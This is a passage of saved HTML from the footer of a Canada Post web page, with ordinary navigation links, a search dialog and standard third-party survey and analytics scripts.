                                  <svg width="24" height="24" xmlns="http://www.w3.org/2000/svg">
                                    <title>Linkedin</title>
                                    <path d="M19.044 19.043h-2.966V14.4c0-1.107-.02-2.531-1.541-2.531-1.544 0-1.78 1.207-1.78 2.452v4.72H9.792V9.499h2.845v1.305h.041c.396-.75 1.364-1.542 2.807-1.542 3.004 0 3.559 1.977 3.559 4.547v5.235zM6.448 8.193a1.72 1.72 0 1 1 0-3.438 1.72 1.72 0 0 1 0 3.439zm-1.484 10.85h2.968V9.498H4.964v9.545zM20.521 2H3.476C2.662 2 2 2.646 2 3.442v17.116C2 21.354 2.662 22 3.476 22h17.045c.816 0 1.479-.647 1.479-1.443V3.442C22 2.646 21.337 2 20.52 2z" class="svg-shape" fill="#CBCBCB" fill-rule="evenodd"></path>
                                  </svg>
                                </a>
                              </li>

                              <li>
                                <a href="https://www.youtube.com/user/postescanadapost" target="_blank">
                                  <svg width="24" height="24" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
                                    <title>YouTube</title>
                                    <g transform="translate(2 5)" fill="none" fill-rule="evenodd">
                                      <path d="M7.935 10.266V4.274l5.403 3.007-5.403 2.985zM19.8 3.236s-.195-1.47-.795-2.117c-.76-.85-1.613-.854-2.004-.903C14.203 0 10.004 0 10.004 0h-.008S5.798 0 2.999.216c-.391.05-1.243.054-2.004.903C.395 1.766.2 3.236.2 3.236S0 4.962 0 6.688v1.618c0 1.725.2 3.451.2 3.451s.195 1.47.795 2.117c.76.85 1.76.823 2.205.912C4.8 14.949 10 15 10 15s4.203-.007 7.001-.222c.391-.05 1.244-.054 2.004-.904.6-.647.795-2.117.795-2.117s.2-1.726.2-3.451V6.688c0-1.726-.2-3.452-.2-3.452z" class="svg-shape" fill="#CBCBCB"></path>
                                    </g>
                                  </svg>
                                </a>
                              </li>

                            </ul>



                            <ul class="feedback-group">

                              <li>
                                <div class="cpc-tb--icon cpc-tb--icon-feedback pk"></div>
                                <a href="https://evaluation.canadapost-postescanada.ca/jfe/form/SV_71iOFlig0vNugpn?Q_lang=EN" target="_blank">
                                  <span class="tool-description">Website feedback</span>
                                </a>
                              </li>

                            </ul>

                            <hr>
                          </li>
                          <li class="accordion-navigation">
                            <a href="https://www.canadapost-postescanada.ca/cpc/en/tools/postal-indicia.page#panelSupport" role="tab" class="accordion-title" id="panelSupport-heading" aria-controls="panelSupport">
                              <h2>Support</h2>
                            </a>
                            <div id="panelSupport" class="content" role="tabpanel" aria-labelledby="panelSupport-heading">

                              <h2 class="show-for-medium-up">Support</h2>
                              <ul>

                                <li>
                                  <a href="https://www.canadapost-postescanada.ca/cpc/en/support.page" class="chat-link" target="">Need help?</a>
                                </li>

                                <li>
                                  <a href="https://www.canadapost-postescanada.ca/cpc/en/support.page#panel2-1" class="chat-link" target="">Contact us</a>
                                </li>

                              </ul>

                            </div>
                            <hr>
                          </li>
                          <li class="accordion-navigation">
                            <a href="https://www.canadapost-postescanada.ca/cpc/en/tools/postal-indicia.page#panelCorporate" role="tab" class="accordion-title" id="panelCorporate-heading" aria-controls="panelCorporate">
                              <h2>Corporate</h2>
                            </a>
                            <div id="panelCorporate" class="content" role="tabpanel" aria-labelledby="panelCorporate-heading">

                              <h2 class="show-for-medium-up">Corporate</h2>
                              <ul>

                                <li>
                                  <a href="https://www.canadapost-postescanada.ca/cpc/en/our-company/about-us.page" target="">About us</a>
                                </li>

                                <li>
                                  <a href="https://www.canadapost-postescanada.ca/cpc/en/our-company/news-and-media/media-centre.page" target="">Media centre</a>
                                </li>

                                <li>
                                  <a href="https://www.canadapost-postescanada.ca/cpc/en/our-company/jobs.page" target="">Careers</a>
                                </li>

                                <li>
                                  <a href="https://infopost.ca/" target="">I'm an employee</a>
                                </li>

                                <li>
                                  <a href="https://mysite.canadapost.ca/saml2/idp/sso?saml2sp=https%3A%2F%2Fwww.successfactors.com%2FS000016952T1&amp;RelayState=%2Fsf%2Fhome" target="">Talent Zone</a>
                                </li>

                                <li>
                                  <a href="https://www.canadapost-postescanada.ca/cpc/en/our-company/news-and-media/corporate-news/negotiations-list.page" target="">Negotiations Updates</a>
                                </li>

                              </ul>

                            </div>
                            <hr>
                          </li>
                          <li class="accordion-navigation">
                            <a href="https://www.canadapost-postescanada.ca/cpc/en/tools/postal-indicia.page#panelBlogs" role="tab" class="accordion-title" id="panelBlogs-heading" aria-controls="panelBlogs">
                              <h2>Blogs</h2>
                            </a>
                            <div id="panelBlogs" class="content" role="tabpanel" aria-labelledby="panelBlogs-heading">

                              <h2 class="show-for-medium-up">Blogs</h2>
                              <ul>

                                <li>
                                  <a href="https://www.canadapost-postescanada.ca/blogs/business" target="">Business Matters</a>
                                </li>

                                <li>
                                  <a href="https://www.canadapost-postescanada.ca/blogs/personal" target="">Canada Post Magazine</a>
                                </li>

                              </ul>

                            </div>
                            <hr>
                          </li>
                        </ul>
                      </div>
                    </div>
                  </section>

                  <section class="footer-l2 " role="contentinfo" aria-label="Content info">
                    <div class="row large-up-footer show-for-large-up">
                      <div class="large-12 columns text-center">
                        <div class="left-items text-left">
                          © Canada Post Corporation
                        </div>
                        <div class="center terms-links">


                          <ul>

                            <li>
                              <a href="https://www.canadapost-postescanada.ca/cpc/en/our-company/about-us/corporate-responsibility/accessibility.page" target="">Accessibility</a>
                            </li>

                            <li>
                              <a href="https://www.canadapost-postescanada.ca/cpc/en/support/kb/general-inquiries/general-information/legal-terms-of-use-and-conditions" target="">Legal</a>
                            </li>

                            <li>
                              <a href="https://www.canadapost-postescanada.ca/cpc/en/our-company/about-us/transparency-and-trust/privacy-centre.page" target="">Privacy</a>
                            </li>

                            <li>
                              <a href="https://www.canadapost-postescanada.ca/cpc/en/our-company/research-panel.page" target="">Research</a>
                            </li>

                          </ul>

                        </div>
                        <div class="right-items">
                          <a href="https://www.canada.ca/">
                            <img src="./file/gov-canada-logo.svg" alt="Canada">
                          </a>
                        </div>
                      </div>
                    </div>
                    <div class="row show-for-medium-only">
                      <div class="large-12 columns text-center">

                        <div class="terms-links">


                          <ul>

                            <li>
                              <a href="https://www.canadapost-postescanada.ca/cpc/en/our-company/about-us/corporate-responsibility/accessibility.page" target="">Accessibility</a>
                            </li>

                            <li>
                              <a href="https://www.canadapost-postescanada.ca/cpc/en/support/kb/general-inquiries/general-information/legal-terms-of-use-and-conditions" target="">Legal</a>
                            </li>

                            <li>
                              <a href="https://www.canadapost-postescanada.ca/cpc/en/our-company/about-us/transparency-and-trust/privacy-centre.page" target="">Privacy</a>
                            </li>

                            <li>
                              <a href="https://www.canadapost-postescanada.ca/cpc/en/our-company/research-panel.page" target="">Research</a>
                            </li>

                          </ul>

                        </div>
                        <div class="cpc-corp-copyright">
                          © Canada Post Corporation

                          <div class="gov-can-logo">
                            <a href="https://www.canada.ca/">
                              <img src="./file/gov-canada-logo.svg" alt="Canada">
                            </a>
                          </div>
                        </div>
                      </div>
                    </div>
                    <div class="row show-for-small-only">
                      <div class="large-12 columns text-center">

                        <div class="center terms-links">


                          <ul>

                            <li>
                              <a href="https://www.canadapost-postescanada.ca/cpc/en/our-company/about-us/corporate-responsibility/accessibility.page" target="">Accessibility</a>
                            </li>

                            <li>
                              <a href="https://www.canadapost-postescanada.ca/cpc/en/support/kb/general-inquiries/general-information/legal-terms-of-use-and-conditions" target="">Legal</a>
                            </li>

                            <li>
                              <a href="https://www.canadapost-postescanada.ca/cpc/en/our-company/about-us/transparency-and-trust/privacy-centre.page" target="">Privacy</a>
                            </li>

                            <li>
                              <a href="https://www.canadapost-postescanada.ca/cpc/en/our-company/research-panel.page" target="">Research</a>
                            </li>

                          </ul>

                        </div>
                        <div class="row">
                          <div class="large-12 columns">
                            <div class="cpc-corp-copyright">
                              © Canada Post Corporation
                            </div>
                          </div>
                        </div>
                        <div class="row">
                          <div class="large-12 columns">
                            <div class="center">
                              <a href="https://www.canada.ca/">
                                <img src="./file/gov-canada-logo.svg" alt="Canada">
                              </a>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </section>
                </div>
              </div>
              <div id="ZN_0xleIR6sWSZaNY9"></div>
              <script>
                (function(){var g=function(e,h,f,g){
                  this.get=function(a){for(var a=a+"=",c=document.cookie.split(";"),b=0,e=c.length;b<e;b++){for(var d=c[b];" "==d.charAt(0);)d=d.substring(1,d.length);if(0==d.indexOf(a))return d.substring(a.length,d.length)}return null};
                  this.set=function(a,c){var b="",b=new Date;b.setTime(b.getTime()+6048E5);b="; expires="+b.toGMTString();document.cookie=a+"="+c+b+"; path=/; "};
                  this.check=function(){var a=this.get(f);if(a)a=a.split(":");else if(100!=e)"v"==h&&(e=Math.random()>=e/100?0:100),a=[h,e,0],this.set(f,a.join(":"));else return!0;var c=a[1];if(100==c)return!0;switch(a[0]){case "v":return!1;case "r":return c=a[2]%Math.floor(100/c),a[2]++,this.set(f,a.join(":")),!c}return!0};
                  this.go=function(){if(this.check()){var a=document.createElement("script");a.type="text/javascript";a.src=g+ "&t=" + (new Date()).getTime();document.body&&document.body.appendChild(a)}};
                  this.start=function(){var a=this;window.addEventListener?window.addEventListener("load",function(){a.go()},!1):window.attachEvent&&window.attachEvent("onload",function(){a.go()})}};
                  try{(new g(100,"r","QSI_S_ZN_0xleIR6sWSZaNY9","https://zn0xleir6swszany9-canadapostdigital.siteintercept.qualtrics.com/WRSiteInterceptEngine/?Q_ZID=ZN_0xleIR6sWSZaNY9&Q_LOC="+encodeURIComponent(window.location.href))).start()}catch(i){}})();
              </script>
            </div>
            <div data-cpc-modal-options="{&quot;preserveOnClose&quot;:&quot;true&quot;,&quot;id&quot;:&quot;qualtricsFeedback&quot;,&quot;footer&quot;:false,&quot;autoOpen&quot;:false,&quot;closeLabel&quot;:&quot;Close&quot;,&quot;closeMethods&quot;:[&quot;overlay&quot;,&quot;button&quot;, &quot;escape&quot;],&quot;cssClass&quot;:[&quot;cpc-feedback-modal&quot;]}" class="cpc-modal__template" id="qualtricsFeedbackModal">
              <div class="cpc-modal-template-modal-body">
                <div class="row">
                  <div class="large-12 columns cpc-feedback-modal-column-wrapper">
                    <div class="cpc-feedback-modal-iframe-container" id="cpc-qualtrics-feedback-modal">
                      <div class="QSIUserDefinedHTML SI_8JvATaFmNHboNxj_UserDefinedHTMLContainer" style="width: 600px; height: 700px; overflow: hidden; position: relative;">
                        <div style="top: 0px; left: 0px; position: absolute; z-index: 2000000000; width: 600px; height: 700px; background-color: rgb(255, 255, 255); border-width: 0px; border-color: transparent; border-style: solid; border-radius: 0px; display: block;" tabindex="0">
                          <div style="position: absolute; top: 0px; left: 0px; width: 600px; height: 700px; overflow: hidden; display: block;">
                            <div class="scrollable" style="width: 600px; height: 700px; transform: translateZ(0px);">
                              <iframe data-src="https://evaluation.canadapost-postescanada.ca/jfe/form/SV_71iOFlig0vNugpn?Q_CHL=si&amp;Q_CanScreenCapture=1" width="100%" height="100%" frameborder="0" name="survey-iframe-SI_8JvATaFmNHboNxj" data-name="embedded-iframe-SI_8JvATaFmNHboNxj" src="./file/saved_resource.html"></iframe>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
            <script type="text/javascript">
              _bizo_data_partner_id = "9198";
                      var metaval = $("meta[name='sns']").attr("content");
                      if(metaval == "business" ){
                      (function(){
                      var s = document.getElementsByTagName("script")[0];
                       var b = document.createElement("script");
                       b.type = "text/javascript";
                       b.async = true;
                       s.parentNode.insertBefore(b, s);
                       }
                       )();
                       }
            </script>
            <script>
              ;
                      (function() {
                        window.cpcAlertBannerMsgs = {
                        };
                          
                      }
                        )();
                        // end IIFE
            </script>
            <script>
              var _comscore = _comscore || [];
                               _comscore.push({
                               c1: "2", c2: "6035946" }
                               );
                               (function() {
                               var s = document.createElement("script"), el = document.getElementsByTagName("script")[0];
                        s.async = true;
                        s.src = (document.location.protocol == "https:" ? "https://sb" : "http://b") + ".scorecardresearch.com/beacon.js";
                        el.parentNode.insertBefore(s, el);
                      }
                      )();
            </script>
            <script src="./file/analytics.js"></script>
            <script type="text/javascript">
              typeof(_satellite) !== "undefined" ? _satellite.pageBottom() : null;
            </script>
            <script>
              if(_hasFired == 'undefined' || isNaN(_hasFired)){
  var _hasFired = 1;
} else {
  _hasFired++
}
console.log("hasFired: " + _hasFired); 
</script>

          </div>
        </div>
      </div>
    </div>
    </div>
    <!--ls:end[body]-->
    <!--ls:begin[page_track]-->
    <!--ls:end[page_track]-->

    <div aria-label="Back to top" class="back-to-top-button" tabindex="0"></div>
    <img src="./file/adsct" height="1" width="1" style="display: none;">
    <img src="./file/adsct(1)" height="1" width="1" style="display: none;">
    <section id="cpcSearchModal">
      <div id="searchPopup" aria-live="assertive" role="dialog" aria-hidden="true">

        <div id="searchModalInputRow">
          <div id="searchModalInputContainer">
            <label for="searchModalInput" class="visually-hidden">Search products, related articles and support topics</label>
            <input id="searchModalInput" type="text" placeholder="Search our website" tabindex="0">
            <button id="searchModalBtn" class="searchModalBtn" aria-label="Search products, related articles and support topics" tabindex="0">Search</button>
          </div>
          <div id="searchModalClose" aria-label="Close" tabindex="0"> </div>

        </div>
        <div id="searchModalLabelError" aria-live="assertive" role="alert">Please enter a topic. Examples: send packages, change my address</div>
        <div id="searchResultsRow">
          <div id="searchModalResults"></div>
          <h2>Popular searches</h2>
          <div class="row">
            <ul id="searchModalQuickLinks" class="searchModalQuickLinks small-12 medium-6 columns">
              <li class="search-modal-quick-link">
                <a href="https://www.canadapost-postescanada.ca/info/mc/personal/postalcode/fpc.jsf" class="search-modal-link" tabindex="0">
                  <span class="search-icon look-up-postal-code"></span>
                  <span class="search-modal-label">Look up a postal code</span>
                </a>
              </li>

              <li class="search-modal-quick-link">
                <a href="https://www.canadapost-postescanada.ca/cpc/en/personal/sending/letters-mail/postage-rates.page" class="search-modal-link" tabindex="0">
                  <span class="search-icon stamp-prices"></span>
                  <span class="search-modal-label">Stamp prices</span>
                </a>
              </li>

              <li class="search-modal-quick-link">
                <a href="https://www.canadapost-postescanada.ca/cpc/en/personal/receiving/manage-mail/mail-forwarding.page" class="search-modal-link" tabindex="0">
                  <span class="search-icon mail-forwarding"></span>
                  <span class="search-modal-label">Mail Forwarding</span>
                </a>
              </li>
            </ul>
            <ul id="searchModalQuickLinks2" class="searchModalQuickLinks small-12 medium-6 columns">
              <li class="search-modal-quick-link">
                <a href="https://www.canadapost-postescanada.ca/track-reperage/en" class="search-modal-link" tabindex="0">
                  <span class="search-icon track"></span>
                  <span class="search-modal-label">Track</span>
                </a>
              </li>

              <li class="search-modal-quick-link">
                <a href="https://www.canadapost-postescanada.ca/cpc/en/support/postal-services-information.page" class="search-modal-link" tabindex="0">
                  <span class="search-icon all-postal-guides"></span>
                  <span class="search-modal-label">All postal guides</span>
                </a>
              </li>

              <li class="search-modal-quick-link">
                <a href="https://www.canadapost-postescanada.ca/cpc/en/support.page" class="search-modal-link" tabindex="0">
                  <span class="search-icon support"></span>
                  <span class="search-modal-label">Support</span>
                </a>
              </li>
            </ul>
            <div>
            </div>
          </div>
        </div>
      </div>
    </section>
    <script type="text/javascript" src="./file/saved_resource"></script>
    <script src="./file/CoreModule.js" defer=""></script>
    <script src="./file/UserDefinedHTMLModule.js" defer=""></script>
    <style type="text/css">
      .QSIUserDefinedHTML div,.QSIUserDefinedHTML dl,.QSIUserDefinedHTML dt,.QSIUserDefinedHTML dd,.QSIUserDefinedHTML ul,.QSIUserDefinedHTML ol,.QSIUserDefinedHTML li,.QSIUserDefinedHTML h1,.QSIUserDefinedHTML h2,.QSIUserDefinedHTML h3,.QSIUserDefinedHTML h4,.QSIUserDefinedHTML h5,.QSIUserDefinedHTML h6,.QSIUserDefinedHTML pre,.QSIUserDefinedHTML form,.QSIUserDefinedHTML fieldset,.QSIUserDefinedHTML textarea,.QSIUserDefinedHTML p,.QSIUserDefinedHTML blockquote,.QSIUserDefinedHTML th,.QSIUserDefinedHTML td {margin: 0;padding: 0;color: black;font-family: arial;font-size: 12px;line-height: normal;}.QSIUserDefinedHTML ul {margin: 12px 0;padding-left: 40px;}.QSIUserDefinedHTML ol,.QSIUserDefinedHTML ul {margin: 12px 0;padding-left: 40px;}.QSIUserDefinedHTML ul li {list-style-type: disc;}.QSIUserDefinedHTML ol li {list-style-type: decimal;}.QSIUserDefinedHTML .scrollable {-webkit-overflow-scrolling: touch;}.QSIUserDefinedHTML table {border-collapse: collapse;border-spacing: 0;}.QSIUserDefinedHTML table td {padding: 2px;}.QSIPopOver *,.QSISlider *,.QSIPopUnder *,.QSIEmbeddedTarget * {box-sizing: content-box;}
    </style>
    <script src="./file/ScreenCaptureModule.js" defer=""></script>
    <div class="QSI_ScreenCapture" style="visibility: hidden;">
      <div data-qsi-sc-class="qsi_sc_backdrop" style="width: 100%; height: 100%; background-color: black; opacity: 0.7; position: fixed; top: 0px; left: 0px; z-index: 2000000000;"></div>
      <div data-qsi-sc-class="qsi_sc_capturing_screen" style="position: fixed; top: 584.5px; left: 827px; margin-top: -50px; margin-left: -50px; z-index: 2000000001;">
        <img data-qsi-sc-class="qsi_sc_cancel_capture_button" src="./file/remove_screen_capture.png" title="Cancel Capturing Screen" alt="Cancel" style="filter: brightness(0) invert(1); display: block; width: 15px; height: 15px; margin-left: 100px; cursor: pointer;">
        <img data-qsi-sc-class="qsi_sc_loading_icon" src="./file/building_preview.gif" alt="" style="width: 100px;">
        <div data-qsi-sc-class="qsi_sc_building_preview_text" style="color: white;">Building Preview ...</div>
      </div>
    </div>
  </body>
</html>